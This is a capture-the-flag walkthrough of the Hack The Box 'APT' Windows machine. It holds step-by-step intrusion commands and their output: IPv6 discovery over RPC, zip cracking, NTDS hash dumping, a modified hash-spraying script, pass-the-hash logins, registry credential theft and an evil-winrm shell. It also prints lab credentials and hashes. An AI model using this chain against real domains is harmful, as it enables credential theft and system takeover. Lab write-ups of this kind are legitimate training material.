APT - Hack The Box - Windows Insane Box
RPC enumeration, ipv6, potatoe exploits, remote registry
RPC to enumerate ipv6 address, bypass firewall access smb to download backup of active directory, grab hashes from active directory
one of them works but we have no remote acceess, use remote registry to pull registry keys and find that some software put a password
in the registry, use that password to get a low priv shell on the box. The you notice ntlmv1 is enable which is crackable hashing 
format. You use the potatoe exploit to make an smb request back to your box and get a net ntlm request that you can crack that
to get administrator password. Not fun enumeration. No clear indication using ipv6, firewall drops all packets.

IP=10.10.10.213


Starting out by looking at nmap results all pointing to port 80 and 135 open. We go to the webpage and only notice html running.
Looking for user input fields but mostly static pages. No email addresses or users to find on the page, we can try to download
images and examine metadata using exiftool, gelocation etc.

We do find an email: mail(at)gigantichosting.com

For testing websites at first glance using web developer tools should suffice: short cut ctrl-shift-I
We look at the network tab an see that it is a POST request. It is not going anywhere. There is no body in the request.
It is trying to send the request via https, times out. Big waste of time.

Just a mirrored page, not much info.

There is a second port 135 msrpc. Mostly ignored for the most part. RPC doesnt give much info mostly used for smb relays.

We will instead focus on impacket, 
Commands and Output:
==================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/apt]
└──╼ $rpcmap.py 'ncacn_ip_tcp:10.10.10.213'
Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation

Procotol: N/A
Provider: rpcss.dll
UUID: 00000136-0000-0000-C000-000000000046 v0.0

Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote
Provider: rpcss.dll
UUID: 000001A0-0000-0000-C000-000000000046 v0.0

Procotol: N/A
Provider: rpcss.dll
UUID: 0B0A6584-9E0F-11CF-A3CF-00805F68CB1B v1.1

Procotol: N/A
Provider: rpcss.dll
UUID: 1D55B526-C137-46C5-AB79-638F2A68E869 v1.0

Procotol: N/A
Provider: rpcss.dll
UUID: 412F241E-C12A-11CE-ABFF-0020AF6E7A17 v0.2

Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote
Provider: rpcss.dll
UUID: 4D9F4AB8-7D1C-11CF-861E-0020AF6E7C57 v0.0

Procotol: N/A
Provider: rpcss.dll
UUID: 64FE0B7F-9EF5-4553-A7DB-9A1975777554 v1.0

Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote
Provider: rpcss.dll
UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0

Protocol: [MS-RPCE]: Remote Management Interface
Provider: rpcrt4.dll
UUID: AFA8BD80-7D8A-11C9-BEF4-08002B102989 v1.0

Procotol: N/A
Provider: rpcss.dll
UUID: B9E79E60-3D52-11CE-AAA1-00006901293F v0.2

Procotol: N/A
Provider: rpcss.dll
UUID: C6F3EE72-CE7E-11D1-B71E-00C04FC3111A v1.0

Procotol: N/A
Provider: rpcss.dll
UUID: E1AF8308-5D1F-11C9-91A4-08002B14A0FA v3.0

Procotol: N/A
Provider: rpcss.dll
UUID: E60C73E6-88F9-11CF-9AF1-0020AF6E72F4 v2.0

==================================================================================================================================

Looking for successful uuids
Commands and Output:
==================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/apt]
└──╼ $rpcmap.py 'ncacn_ip_tcp:10.10.10.213' -brute-opnums -brute-uuids -auth-level 1 -opnum-max 5
==================================================================================================================================

We go to the following webpage to look at one uuids that was successful:99FCFEC4-5260-101B-BBCB-00AA0021347A
https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/8ed0ae33-56a1-44b7-979f-5972f0e9416c

We come to find find for the dcom uuid we can do server alive and server alive2 requests.

Commands and Output:
==================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/apt]
└──╼ $rpcmap.py 'ncacn_ip_tcp:10.10.10.213' -brute-opnums -brute-uuids -auth-level 1 -opnum-max 5
Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation

Procotol: N/A
Provider: rpcss.dll
UUID: 00000136-0000-0000-C000-000000000046 v0.0
Opnums 0-5: rpc_s_access_denied

Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote
Provider: rpcss.dll
UUID: 000001A0-0000-0000-C000-000000000046 v0.0
Opnums 0-5: rpc_s_access_denied

Procotol: N/A
Provider: rpcss.dll
UUID: 0B0A6584-9E0F-11CF-A3CF-00805F68CB1B v1.0
Opnums 0-5: rpc_s_access_denied

Procotol: N/A
Provider: rpcss.dll
UUID: 0B0A6584-9E0F-11CF-A3CF-00805F68CB1B v1.1
Opnums 0-5: rpc_s_access_denied

Procotol: N/A
Provider: rpcss.dll
UUID: 1D55B526-C137-46C5-AB79-638F2A68E869 v1.0
Opnums 0-5: rpc_s_access_denied

Procotol: N/A
Provider: rpcss.dll
UUID: 412F241E-C12A-11CE-ABFF-0020AF6E7A17 v0.0
Opnums 0-5: rpc_s_access_denied

Procotol: N/A
Provider: rpcss.dll
UUID: 412F241E-C12A-11CE-ABFF-0020AF6E7A17 v0.2
Opnums 0-5: rpc_s_access_denied

Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote
Provider: rpcss.dll
UUID: 4D9F4AB8-7D1C-11CF-861E-0020AF6E7C57 v0.0
Opnums 0-5: rpc_s_access_denied

Procotol: N/A
Provider: rpcss.dll
UUID: 64FE0B7F-9EF5-4553-A7DB-9A1975777554 v1.0
Opnums 0-5: rpc_s_access_denied

Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote
Provider: rpcss.dll
UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0
Opnum 0: rpc_x_bad_stub_data
Opnum 1: rpc_x_bad_stub_data
Opnum 2: rpc_x_bad_stub_data
Opnum 3: success
Opnum 4: rpc_x_bad_stub_data
Opnum 5: success

Protocol: [MS-RPCE]: Remote Management Interface
Provider: rpcrt4.dll
UUID: AFA8BD80-7D8A-11C9-BEF4-08002B102989 v1.0
Opnum 0: success
Opnum 1: rpc_x_bad_stub_data
Opnum 2: success
Opnum 3: success
Opnum 4: rpc_x_bad_stub_data
Opnum 5: nca_s_op_rng_error (opnum not found)

Procotol: N/A
Provider: rpcss.dll
UUID: B9E79E60-3D52-11CE-AAA1-00006901293F v0.0
Opnums 0-5: rpc_s_access_denied

Procotol: N/A
Provider: rpcss.dll
UUID: B9E79E60-3D52-11CE-AAA1-00006901293F v0.2
Opnums 0-5: rpc_s_access_denied

Procotol: N/A
Provider: rpcss.dll
UUID: C6F3EE72-CE7E-11D1-B71E-00C04FC3111A v1.0
Opnums 0-5: rpc_s_access_denied

Procotol: N/A
Provider: rpcss.dll
UUID: E1AF8308-5D1F-11C9-91A4-08002B14A0FA v3.0
Opnum 0: rpc_fault_cant_perform
Opnum 1: rpc_fault_cant_perform
Opnum 2: rpc_x_bad_stub_data
Opnum 3: rpc_x_bad_stub_data
Opnum 4: rpc_x_bad_stub_data
Opnum 5: rpc_fault_cant_perform

Procotol: N/A
Provider: rpcss.dll
UUID: E60C73E6-88F9-11CF-9AF1-0020AF6E72F4 v2.0
Opnums 0-5: rpc_s_access_denied

[*] Tested 354 UUID(s)

==================================================================================================================================


We find an interesting oxid resolver blog post that relates to the uuid 99FCFEC4-5260-101B-BBCB-00AA0021347A
https://airbus-cyber-security.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/

It has python script that we could possibbly use to interact with port 135 dcom service.
Commands and Output:
==================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/apt]
└──╼ $python oxidresolver.py -t 10.10.10.213
[*] Retrieving network interface of 10.10.10.213
Address: apt
Address: 10.10.10.213
Address: dead:beef::b885:d62a:d679:573f
Address: dead:beef::a906:da4c:a081:8216
==================================================================================================================================

┌─[user@parrot-virtual]─[~/htb/apt]
└──╼ $cat IOXIDResolver.py | xclip -selection clipboard

Interesting things is that we now have ipv6 addresses and interfaces, security bindings for the object resolver.

We can now edit our hosts file and add those addresses. Now we can do an ipv6 nmap scan and we can see a bunch of ports open.
Commands and Output:
==================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/apt]
└──╼ $sudo nmap -6 apt
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-10 22:11 PDT
Stats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 26.30% done; ETC: 22:11 (0:00:08 remaining)
Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 46.40% done; ETC: 22:11 (0:00:05 remaining)
Nmap scan report for apt (dead:beef::b885:d62a:d679:573f)
Host is up (0.10s latency).
Not shown: 991 filtered ports
PORT    STATE SERVICE
53/tcp  open  domain
80/tcp  open  http
88/tcp  open  kerberos-sec
135/tcp open  msrpc
389/tcp open  ldap
445/tcp open  microsoft-ds
464/tcp open  kpasswd5
593/tcp open  http-rpc-epmap
636/tcp open  ldapssl

Nmap done: 1 IP address (1 host up) scanned in 7.26 seconds
==================================================================================================================================

Windows does not respond to broadcast messages.

We can now attempt with the use of the ipv6 address to enumerate using smbclient
Commands and Output:
==================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/apt]
└──╼ $smbclient -L //apt/
Enter WORKGROUP\user's password: 
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	backup          Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
apt is an IPv6 address -- no workgroup available
==================================================================================================================================


We can try and look at the backup directory
Commands and Output:
==================================================================================================================================
┌─[✗]─[user@parrot-virtual]─[~/htb/apt]
└──╼ $smbclient //apt/backup
Enter WORKGROUP\user's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Sep 24 00:30:52 2020
  ..                                  D        0  Thu Sep 24 00:30:52 2020
  backup.zip                          A 10650961  Thu Sep 24 00:30:32 2020

		10357247 blocks of size 4096. 6956544 blocks available
==================================================================================================================================

We see a zip file that we can download.
Commands and Output:
==================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/apt]
└──╼ $unzip backup.zip 
Archive:  backup.zip
   creating: Active Directory/
[backup.zip] Active Directory/ntds.dit password: 
password incorrect--reenter: 
   skipping: Active Directory/ntds.dit  incorrect password
   skipping: Active Directory/ntds.jfm  incorrect password
   creating: registry/
   skipping: registry/SECURITY       incorrect password
   skipping: registry/SYSTEM         incorrect password
==================================================================================================================================

We try to unzip it but it needs a password, however from the looks of it the backup contains active directory hashes and registry values
that are saved.

We will be using john the ripper's zip2john to get a hash that we can use to crack the zip file.
Commands and Output:
==================================================================================================================================
┌─[✗]─[user@parrot-virtual]─[~/htb/apt]
└──╼ $zip2john backup.zip 
Created directory: /home/user/.john
backup.zip/Active Directory/ is not encrypted!
ver 2.0 backup.zip/Active Directory/ is not encrypted, or stored with non-handled compression type
ver 2.0 backup.zip/Active Directory/ntds.dit PKZIP Encr: cmplen=8483543, decmplen=50331648, crc=ACD0B2FB
ver 2.0 backup.zip/Active Directory/ntds.jfm PKZIP Encr: cmplen=342, decmplen=16384, crc=2A393785
ver 2.0 backup.zip/registry/ is not encrypted, or stored with non-handled compression type
ver 2.0 backup.zip/registry/SECURITY PKZIP Encr: cmplen=8522, decmplen=262144, crc=9BEBC2C3
ver 2.0 backup.zip/registry/SYSTEM PKZIP Encr: cmplen=2157644, decmplen=12582912, crc=65D9BFCD
backup.zip:$pkzip2$3*1*1*0*8*24*9beb*9ac6*0f135e8d5f02f852643d295a889cbbda196562ad42425146224a8804421ca88f999017ed*1*0*8*24*acd0*9cca*0949e46299de5eb626c75d63d010773c62b27497d104ef3e2719e225fbde9d53791e11a5*2*0*156*4000*2a393785*81733d*37*8*156*2a39*9cca*0325586c0d2792d98131a49d1607f8a2215e39d59be74062d0151084083c542ee61c530e78fa74906f6287a612b18c788879a5513f1542e49e2ac5cf2314bcad6eff77290b36e47a6e93bf08027f4c9dac4249e208a84b1618d33f6a54bb8b3f5108b9e74bc538be0f9950f7ab397554c87557124edc8ef825c34e1a4c1d138fe362348d3244d05a45ee60eb7bba717877e1e1184a728ed076150f754437d666a2cd058852f60b13be4c55473cfbe434df6dad9aef0bf3d8058de7cc1511d94b99bd1d9733b0617de64cc54fc7b525558bc0777d0b52b4ba0a08ccbb378a220aaa04df8a930005e1ff856125067443a98883eadf8225526f33d0edd551610612eae0558a87de2491008ecf6acf036e322d4793a2fda95d356e6d7197dcd4f5f0d21db1972f57e4f1543c44c0b9b0abe1192e8395cd3c2ed4abec690fdbdff04d5bb6ad12e158b6a61d184382fbf3052e7fcb6235a996*$/pkzip2$::backup.zip:Active Directory/ntds.jfm, registry/SECURITY, Active Directory/ntds.dit:backup.zip
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.

==================================================================================================================================

It cracks instantly.
Commands and Output:
==================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/apt]
└──╼ $john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iloveyousomuch   (backup.zip)
1g 0:00:00:00 DONE (2021-04-10 22:40) 50.00g/s 409600p/s 409600c/s 409600C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed
==================================================================================================================================

We can use all ntds information alongside secretsump.py to dump passwords and hashes
Commands and Output:
==================================================================================================================================
┌─[✗]─[user@parrot-virtual]─[~/htb/apt/backup]
└──╼ $secretsdump.py -pwd-last-set -user-status -history -ntds Active\ Directory/ntds.dit -security registry/SECURITY -system registry/SYSTEM local
Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x936ce5da88593206567f650411e1d16b
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:34005b00250066006f0027007a004700600026004200680052003300630050005b002900550032004e00560053005c004c00450059004f002f0026005e0029003c00390078006a0036002500230039005c005c003f0075004a0034005900500062006000440052004b00220020004900450053003200660058004b00220066002c005800280051006c002a0066006700300052006600520071003d0021002c004200650041005600460074005e0045005600520052002d004c0029005600610054006a0076002f005100470039003d006f003b004700400067003e005600610062002d00550059006300200059006400
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:b300272f1cdab4469660d55fe59415cb
[*] $MACHINE.ACC_history 
$MACHINE.ACC:plain_password_hex:6a00280059004c003d005100450036005f006c006e005f0042004a00570046006f00210024006800440075006d002200450021003700280049002300450051004100750058005a002200290046003f006e0031005f00270035006100730060005e003200520054005800520041005f00460061004c0051003f0023005100390046003b006d0035003f002b004e0025003b004b0052006000660069002f00490046005800430027005e00430063005d003f002200400026004500390047003f002000770043004300390028003a005c003e0036005000610060004d003b004f005e002e0040003f002b0068003d005c00
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:e1934528fd9be4bb06e648526acc4a4d
[*] DefaultPassword 
(Unknown User):Password123!
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x3e0d78cb8f3ed66196584c44b5701501789fc102
dpapi_userkey:0xdcde3fc585c430a72221a48691fb202218248d46
[*] DPAPI_SYSTEM_history 
dpapi_machinekey:0x915920993c6fd9b583394683714c81fbcdccd089
dpapi_userkey:0x9847b88d39cfaf37d30483c52c3954e92f0f2a4e

......
.....
...
==================================================================================================================================

A lot of data is being dumped. The ntds.dit is the active directory database security, the SECURITY file is the encryption key used
to decrypt ntds.dit but that key is obfuscated by the boot key which exists in the system. That key in secuirty is itslef encypted by
a key in the SYSTEM file.

Well now we have a long list of users that we could potentially use for authentication, we will grep for the users that could potentially
authenticate and then use kerbute to try and see who has access. It does a kerberos preuath check to see if users are valid.

Good for password spraying and evasion since it is not logged.
Commands and Output:
==================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/apt/backup]
└──╼ $grep aad3b435b51404eeaad3b435b51404ee secretsdump.bak | awk -F: '{print $1}' | grep -v history | sort -u > users.lst
==================================================================================================================================

Commands and Output:
==================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/apt/backup]
└──╼ $kerbrute userenum --dc apt -d htb.local users.lst 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 04/10/21 - Ronnie Flathers @ropnop

2021/04/10 23:24:58 >  Using KDC(s):
2021/04/10 23:24:58 >  	apt:88

2021/04/10 23:25:09 >  [+] VALID USERNAME:	 Administrator@htb.local
2021/04/10 23:26:11 >  [+] VALID USERNAME:	 APT$@htb.local
2021/04/10 23:32:20 >  [+] VALID USERNAME:	 henry.vinson@htb.local
2021/04/10 23:42:21 >  Done! Tested 2001 usernames (3 valid) in 1042.890 seconds

==================================================================================================================================

So we can now grep from for the administrator user

Commands and Output:
==================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/apt/backup]
└──╼ $grep -i administrator secretsdump.bak 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe::: (pwdLastSet=2020-09-22 04:53) (status=Enabled)
Administrator_history0:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
Administrator:aes256-cts-hmac-sha1-96:d35ae5b9bf5ee7f6c4480bb73b3d8235f022b4fd504c7a3e35b9101b4c40e1d4
Administrator:aes128-cts-hmac-sha1-96:26c50872286f2847fc85cf611871106d
Administrator:des-cbc-md5:c767fd15d55eabef
==================================================================================================================================

We can attempt to login with the hash. We will check the password policy first with crackmapexec
Commands and Output:
==================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/apt/backup]
└──╼ $crackmapexec smb apt --pass-pol
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)

==================================================================================================================================

Looks like we can't do it anonymously. Alright let's try to authenticate.
Commands and Output:
==================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/apt/backup]
└──╼ $crackmapexec smb apt -u administrator -H 2b576acbe6bcfda7294d6bd18041b8fe
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [-] htb.local\administrator:2b576acbe6bcfda7294d6bd18041b8fe STATUS_LOGON_FAILURE 
==================================================================================================================================

Unfortuantely we can't. We will now try the normal user henry vinson and see if we can get a successful login.

Commands and Output:
==================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/apt/backup]
└──╼ $grep henry.vinson secretsdump.bak 
henry.vinson:3647:aad3b435b51404eeaad3b435b51404ee:2de80758521541d19cabba480b260e8f::: (pwdLastSet=2020-09-23 10:36) (status=Enabled)
henry.vinson_history0:3647:aad3b435b51404eeaad3b435b51404ee:5b8c6b8b4c4de075eaa7f703dad3f831:::
henry.vinson:aes256-cts-hmac-sha1-96:4c0ec4cffc953266ed72d9b565da62115655d2f402416af92e4e76d121663e2f
henry.vinson:aes128-cts-hmac-sha1-96:da63c28166768a2829f00d30ec9fbddd
henry.vinson:des-cbc-md5:80a2c83213b3dfd6

┌─[user@parrot-virtual]─[~/htb/apt/backup]
└──╼ $crackmapexec smb apt -u 'henry.vinson' -H 2de80758521541d19cabba480b260e8f
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [-] htb.local\henry.vinson:2de80758521541d19cabba480b260e8f STATUS_LOGON_FAILURE 
┌─[user@parrot-virtual]─[~/htb/apt/backup]
└──╼ $crackmapexec smb apt -u 'henry.vinson' -H '5b8c6b8b4c4de075eaa7f703dad3f831'
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [-] htb.local\henry.vinson:5b8c6b8b4c4de075eaa7f703dad3f831 STATUS_LOGON_FAILURE
==================================================================================================================================

We try both passwords, but all end in failure. Next what will attempt is to password spray using all ntlm hashes using the henry user.
We wil use pykerbrute for this to work. RC4-HMAC that;s in ntlm (md4sum) utf16 little endian encoded easy to crack.
We first need to get all hashes and out put them to a file.

Commands and Output:
==================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/apt/backup]
└──╼ $grep aad3b435b51404eeaad3b435b51404ee secretsdump.bak | awk -F: '{print $4}' | sort -u > hashes.txt

### Now we will need to modify the pykerbute file to get it to password spray correctly.
┌─[user@parrot-virtual]─[~/htb/apt/backup]
└──╼ $git clone https://github.com/3gstudent/pyKerbrute.git

############## WE modify and add the follwoing code to the main of ADpassword spray python file ##############
284                 print('[+] Valid Login: %s:%s'%(user_name,orgin_key))$
285 +++$
286 if __name__ == '__main__':$
287 $
288     user_realm = 'HTB.LOCAL'$
289     username = 'henry.vinson'$
290     kdc_a = 'APT'$
291     with open('hashes.txt', 'r') as f:$
292         hashes = f.readlines()$
293         for ntlm in hashes:$
294             try:$
295                 ntlm = ntlm.strip('\r\n')$
296                 user_key = (RC4_HMAC, ntlm.decode('hex'))$
297                 passwordspray_tcp (user_realm, username, user_key, kdc_a, ntlm)$
298             except:$
299                 print ntlm$
300                 print str(err)$
301 $
########################################################################################################

##############We also modify the IF net name to ipv6 for the script to work correctly ######
202     sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)$
#############################################################################################
==================================================================================================================================

After a while of running the script we get a hit.
Commands and Output:
==================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/apt/backup/pyKerbrute]
└──╼ $python2 ADPwdSpray.py 
[+] Valid Login: henry.vinson:e53d87d42adaa3ca32bdb34a876cbffb
==================================================================================================================================

We can now attempt to use crack map exec and authenticate to test it.
Commands and Output:
==================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/apt/backup]
└──╼ $crackmapexec smb apt -u 'henry.vinson' -H e53d87d42adaa3ca32bdb34a876cbffb
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [+] htb.local\henry.vinson e53d87d42adaa3ca32bdb34a876cbffb 
==================================================================================================================================

Indeed we can now successfully login with that user hash value. We don't see pwned so we can not really do anything. We can check for
winrm access(replace smb with winrm) but to no avail.

So we don't find much with this so second thing to try and do is look at the registry. We will use the reg.py from impacket to try
to get more insights with regards to registry value and see what we can find.

It might fail the first time so try twice.

Commands and Output:
==================================================================================================================================
┌─[✗]─[user@parrot-virtual]─[~/htb/apt/backup/pyKerbrute]
└──╼ $reg.py -hashes e53d87d42adaa3ca32bdb34a876cbffb:e53d87d42adaa3ca32bdb34a876cbffb htb.local/henry.vinson@apt query -keyName HKU\\
Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation

[!] Cannot check RemoteRegistry status. Hoping it is started...
[-] SMB SessionError: STATUS_PIPE_NOT_AVAILABLE(An instance of a named pipe cannot be found in the listening state.)
┌─[user@parrot-virtual]─[~/htb/apt/backup/pyKerbrute]
└──╼ $reg.py -hashes e53d87d42adaa3ca32bdb34a876cbffb:e53d87d42adaa3ca32bdb34a876cbffb htb.local/henry.vinson@apt query -keyName HKU\\
Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation

[!] Cannot check RemoteRegistry status. Hoping it is started...
HKU\
HKU\\Console
HKU\\Control Panel
HKU\\Environment
HKU\\Keyboard Layout
HKU\\Network
HKU\\Software
HKU\\System
HKU\\Volatile Environment

==================================================================================================================================

Every now and then software will store it's secrets inside the registry. Putty usually store encrypted usernames and passwords in the 
registry. So we check it out as well as hosting management system software and low and behold. We find a username and password.

Commands and Output:
==================================================================================================================================
└──╼ $reg.py -hashes e53d87d42adaa3ca32bdb34a876cbffb:e53d87d42adaa3ca32bdb34a876cbffb htb.local/henry.vinson@apt query -keyName HKU\\Software\\
Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation

[!] Cannot check RemoteRegistry status. Hoping it is started...
HKU\Software\
HKU\Software\\GiganticHostingManagementSystem
HKU\Software\\Microsoft
HKU\Software\\Policies
HKU\Software\\RegisteredApplications
HKU\Software\\VMware, Inc.
HKU\Software\\Wow6432Node
HKU\Software\\Classes
┌─[user@parrot-virtual]─[~/htb/apt/backup/pyKerbrute]
└──╼ $reg.py -hashes e53d87d42adaa3ca32bdb34a876cbffb:e53d87d42adaa3ca32bdb34a876cbffb htb.local/henry.vinson@apt query -keyName HKU\\Software\\GiganticHostingManagementSystem\\
Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation

[!] Cannot check RemoteRegistry status. Hoping it is started...
HKU\Software\GiganticHostingManagementSystem\
	UserName	REG_SZ	 henry.vinson_adm
	PassWord	REG_SZ	 G1#Ny5@2dvht
==================================================================================================================================

We test the password on smb to see if it is valid and it is
Commands and Output:
==================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/apt/backup]
└──╼ $crackmapexec smb apt -u 'henry.vinson_adm' -p 'G1#Ny5@2dvht'
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [+] htb.local\henry.vinson_adm:G1#Ny5@2dvht 
==================================================================================================================================

Next we will try using evil-winrm and we get a shell
Commands and Output:
==================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/apt/backup]
└──╼ $evil-winrm -i apt -u 'henry.vinson_adm' -p 'G1#Ny5@2dvht'

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\henry.vinson_adm\Documents>
==================================================================================================================================

Commands and Output:
==================================================================================================================================
*Evil-WinRM* PS C:\Users\henry.vinson_adm> get-aduser Administrator -Properties *


AccountExpirationDate                :
accountExpires                       : 0
AccountLockoutTime                   :
AccountNotDelegated                  : False
adminCount                           : 1
AllowReversiblePasswordEncryption    : False
AuthenticationPolicy                 : {}
AuthenticationPolicySilo             : {}
BadLogonCount                        : 0
badPasswordTime                      : 0
badPwdCount                          : 0
CannotChangePassword                 : False
CanonicalName                        : htb.local/Users/Administrator
Certificates                         : {}
City                                 :
CN                                   : Administrator
codePage                             : 0
Company                              :
CompoundIdentitySupported            : {}
Country                              :
countryCode                          : 0
Created                              : 9/24/2020 8:15:43 AM
createTimeStamp                      : 9/24/2020 8:15:43 AM
Deleted                              :
Department                           :
Description                          : Built-in account for administering the computer/domain
DisplayName                          :
DistinguishedName                    : CN=Administrator,CN=Users,DC=htb,DC=local
Division                             :
DoesNotRequirePreAuth                : False
dSCorePropagationData                : {9/24/2020 8:31:20 AM, 9/24/2020 8:31:20 AM, 9/24/2020 8:16:11 AM, 1/1/1601 6:12:16 PM}
EmailAddress                         :
EmployeeID                           :
EmployeeNumber                       :
Enabled                              : True
Fax                                  :
GivenName                            :
HomeDirectory                        :
HomedirRequired                      : False
HomeDrive                            :
HomePage                             :
HomePhone                            :
Initials                             :
instanceType                         : 4
isCriticalSystemObject               : True
isDeleted                            :
KerberosEncryptionType               : {}
LastBadPasswordAttempt               :
LastKnownParent                      :
lastLogoff                           : 0
lastLogon                            : 132626340343476452
LastLogonDate                        : 4/11/2021 5:59:08 PM
lastLogonTimestamp                   : 132626339484568522
LockedOut                            : False
logonCount                           : 370
logonHours                           : {255, 255, 255, 255...}
LogonWorkstations                    :
Manager                              :
MemberOf                             : {CN=Group Policy Creator Owners,CN=Users,DC=htb,DC=local, CN=Domain Admins,CN=Users,DC=htb,DC=local, CN=Enterprise Admins,CN=Users,DC=htb,DC=local, CN=Schema Admins,CN=Users,DC=htb,DC=local...}
MNSLogonAccount                      : False
MobilePhone                          :
Modified                             : 4/11/2021 5:59:08 PM
modifyTimeStamp                      : 4/11/2021 5:59:08 PM
msDS-User-Account-Control-Computed   : 0
Name                                 : Administrator
nTSecurityDescriptor                 : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                       : CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
ObjectClass                          : user
ObjectGUID                           : 56e767c4-4f9d-4bdb-86ed-3c9152d4e269
objectSid                            : S-1-5-21-2993095098-2100462451-206186470-500
Office                               :
OfficePhone                          :
Organization                         :
OtherName                            :
PasswordExpired                      : False
PasswordLastSet                      : 9/24/2020 8:16:56 AM
PasswordNeverExpires                 : True
PasswordNotRequired                  : False
POBox                                :
PostalCode                           :
PrimaryGroup                         : CN=Domain Users,CN=Users,DC=htb,DC=local
primaryGroupID                       : 513
PrincipalsAllowedToDelegateToAccount : {}
ProfilePath                          :
ProtectedFromAccidentalDeletion      : False
pwdLastSet                           : 132454054168771003
SamAccountName                       : Administrator
sAMAccountType                       : 805306368
ScriptPath                           :
sDRightsEffective                    : 0
ServicePrincipalNames                : {}
SID                                  : S-1-5-21-2993095098-2100462451-206186470-500
SIDHistory                           : {}
SmartcardLogonRequired               : False
State                                :
StreetAddress                        :
Surname                              :
Title                                :
TrustedForDelegation                 : False
TrustedToAuthForDelegation           : False
UseDESKeyOnly                        : False
userAccountControl                   : 66048
userCertificate                      : {}
